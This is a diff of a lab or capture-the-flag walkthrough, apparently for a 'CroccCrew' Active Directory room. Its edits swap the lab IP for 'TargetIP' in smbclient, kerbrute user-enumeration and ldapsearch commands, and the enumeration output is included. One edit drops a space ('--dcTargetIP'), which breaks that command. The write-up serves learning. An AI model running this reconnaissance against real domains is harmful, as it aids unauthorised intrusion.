@@ -323,7 +323,7 @@ rpcclient $> exit
 <br>
 
 ```bash
-:~/CroccCrew# smbclient //10.10.130.42/SYSVOL -U "Visitor"
+:~/CroccCrew# smbclient //TargetIP/SYSVOL -U "Visitor"
 Password for [WORKGROUP\Visitor]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -372,7 +372,7 @@ Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download
 :~/CroccCrew# chmod +x kerbrute_linux_amd64
 ...
 
-~/CroccCrew# ./kerbrute_linux_amd64 userenum -d COOCTUS.CORP --dc 10.10.130.42 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
+~/CroccCrew# ./kerbrute_linux_amd64 userenum -d COOCTUS.CORP --dcTargetIP /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -383,7 +383,7 @@ Downloaded it from here --> https://github.com/ropnop/kerbrute/releases/download
 Version: v1.0.3 (9dad6e1) - 05/01/25 - Ronnie Flathers @ropnop
 
 2025/05/01 00:08:46 >  Using KDC(s):
-2025/05/01 00:08:46 >  	10.10.130.42:88
+2025/05/01 00:08:46 >  	TargetIP:88
 
 2025/05/01 00:08:46 >  [+] VALID USERNAME:	 david@COOCTUS.CORP
 2025/05/01 00:08:46 >  [+] VALID USERNAME:	 mark@COOCTUS.CORP
@@ -523,7 +523,7 @@ tion a successful bind must be completed on the connection., data 0, v4563
 <br>
 
 ```bash
-:~/CroccCrew# ldapsearch -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -H ldap://10.10.130.42 -W > ldap_report.txt
+:~/CroccCrew# ldapsearch -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -H ldap://TargetIP -W > ldap_report.txt
 Enter LDAP Password: 
 ```
 
